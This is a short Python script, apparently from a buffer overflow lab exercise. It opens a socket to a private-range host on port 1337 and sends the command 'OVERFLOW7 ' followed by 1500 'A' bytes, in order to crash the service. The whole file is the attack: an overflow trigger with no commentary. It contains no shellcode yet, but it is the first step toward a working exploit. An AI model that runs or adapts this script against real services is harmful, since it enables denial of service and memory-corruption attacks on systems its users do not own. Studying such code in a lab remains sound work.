import struct, socket



host, port = '10.10.243.3', 1337

command = b'OVERFLOW7 '



payload = b''.join([

command,
b'A'*1500,


])



with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
